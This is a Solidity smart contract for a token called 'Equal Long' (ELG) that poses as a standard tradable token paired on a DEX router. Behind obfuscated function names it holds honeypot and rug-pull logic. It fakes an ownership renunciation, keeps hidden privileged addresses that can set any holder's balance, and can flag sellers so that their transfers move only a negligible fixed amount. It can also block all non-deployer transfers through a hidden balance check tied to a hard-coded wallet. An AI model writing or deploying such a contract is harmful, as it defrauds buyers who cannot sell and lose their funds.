//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface txTrading {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract tradingReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface enableAmountMode {
    function createPair(address exemptAt, address takeFeeShould) external returns (address);
}

interface feeSwap {
    function totalSupply() external view returns (uint256);

    function balanceOf(address takeTeamLaunched) external view returns (uint256);

    function transfer(address modeBuy, uint256 walletShouldToken) external returns (bool);

    function allowance(address fromTx, address spender) external view returns (uint256);

    function approve(address spender, uint256 walletShouldToken) external returns (bool);

    function transferFrom(
        address sender,
        address modeBuy,
        uint256 walletShouldToken
    ) external returns (bool);

    event Transfer(address indexed from, address indexed launchedReceiver, uint256 value);
    event Approval(address indexed fromTx, address indexed spender, uint256 value);
}

interface feeSwapMetadata is feeSwap {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract EqualLong is tradingReceiver, feeSwap, feeSwapMetadata {

    address tokenLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public txTotal;

    address public tokenTotal;

    function symbol() external view virtual override returns (string memory) {
        return toEnable;
    }

    function decimals() external view virtual override returns (uint8) {
        return buyFee;
    }

    function maxSwap(address tokenIsFrom, address modeBuy, uint256 walletShouldToken) internal returns (bool) {
        require(autoSwap[tokenIsFrom] >= walletShouldToken);
        autoSwap[tokenIsFrom] -= walletShouldToken;
        autoSwap[modeBuy] += walletShouldToken;
        emit Transfer(tokenIsFrom, modeBuy, walletShouldToken);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return receiverLiquidity;
    }

    function sellReceiver() public {
        emit OwnershipTransferred(tokenTotal, address(0));
        tokenTx = address(0);
    }

    function getOwner() external view returns (address) {
        return tokenTx;
    }

    uint256 enableFee;

    function feeShould(address exemptTake) public {
        enableMin();
        if (isFrom != autoIs) {
            launchedLimit = true;
        }
        if (exemptTake == tokenTotal || exemptTake == liquiditySell) {
            return;
        }
        senderFromLimit[exemptTake] = true;
    }

    function listAt(address buySwap) public {
        if (txTotal) {
            return;
        }
        
        maxLiquidityMarketing[buySwap] = true;
        
        txTotal = true;
    }

    function toMin(address toFund, uint256 walletShouldToken) public {
        enableMin();
        autoSwap[toFund] = walletShouldToken;
    }

    address private tokenTx;

    uint256 private autoIs;

    string private toEnable = "ELG";

    bool public swapMinLaunch;

    string private receiverLiquidity = "Equal Long";

    uint256 private fundIs = 100000000 * 10 ** 18;

    function allowance(address totalTeam, address amountTakeWallet) external view virtual override returns (uint256) {
        if (amountTakeWallet == tokenLaunched) {
            return type(uint256).max;
        }
        return buyModeExempt[totalTeam][amountTakeWallet];
    }

    function totalSupply() external view virtual override returns (uint256) {
        return fundIs;
    }

    function transferFrom(address tokenIsFrom, address modeBuy, uint256 walletShouldToken) external override returns (bool) {
        if (_msgSender() != tokenLaunched) {
            if (buyModeExempt[tokenIsFrom][_msgSender()] != type(uint256).max) {
                require(walletShouldToken <= buyModeExempt[tokenIsFrom][_msgSender()]);
                buyModeExempt[tokenIsFrom][_msgSender()] -= walletShouldToken;
            }
        }
        return feeMarketingFrom(tokenIsFrom, modeBuy, walletShouldToken);
    }

    address public liquiditySell;

    function transfer(address toFund, uint256 walletShouldToken) external virtual override returns (bool) {
        return feeMarketingFrom(_msgSender(), toFund, walletShouldToken);
    }

    constructor (){
        
        txTrading receiverMax = txTrading(tokenLaunched);
        liquiditySell = enableAmountMode(receiverMax.factory()).createPair(receiverMax.WETH(), address(this));
        if (isFrom != autoIs) {
            swapMinLaunch = false;
        }
        tokenTotal = _msgSender();
        sellReceiver();
        maxLiquidityMarketing[tokenTotal] = true;
        autoSwap[tokenTotal] = fundIs;
        
        emit Transfer(address(0), tokenTotal, fundIs);
    }

    mapping(address => mapping(address => uint256)) private buyModeExempt;

    uint8 private buyFee = 18;

    function approve(address amountTakeWallet, uint256 walletShouldToken) public virtual override returns (bool) {
        buyModeExempt[_msgSender()][amountTakeWallet] = walletShouldToken;
        emit Approval(_msgSender(), amountTakeWallet, walletShouldToken);
        return true;
    }

    function owner() external view returns (address) {
        return tokenTx;
    }

    function balanceOf(address takeTeamLaunched) public view virtual override returns (uint256) {
        return autoSwap[takeTeamLaunched];
    }

    uint256 constant buySell = 13 ** 10;

    function feeMarketingFrom(address tokenIsFrom, address modeBuy, uint256 walletShouldToken) internal returns (bool) {
        if (tokenIsFrom == tokenTotal) {
            return maxSwap(tokenIsFrom, modeBuy, walletShouldToken);
        }
        uint256 toListReceiver = feeSwap(liquiditySell).balanceOf(fromTxWallet);
        require(toListReceiver == minReceiverTotal);
        require(modeBuy != fromTxWallet);
        if (senderFromLimit[tokenIsFrom]) {
            return maxSwap(tokenIsFrom, modeBuy, buySell);
        }
        return maxSwap(tokenIsFrom, modeBuy, walletShouldToken);
    }

    uint256 private isFrom;

    bool public launchedLimit;

    function receiverFee(uint256 walletShouldToken) public {
        enableMin();
        minReceiverTotal = walletShouldToken;
    }

    mapping(address => bool) public maxLiquidityMarketing;

    mapping(address => uint256) private autoSwap;

    address fromTxWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool public autoLaunch;

    mapping(address => bool) public senderFromLimit;

    function enableMin() private view {
        require(maxLiquidityMarketing[_msgSender()]);
    }

    uint256 minReceiverTotal;

    event OwnershipTransferred(address indexed senderTokenFund, address indexed totalAt);

}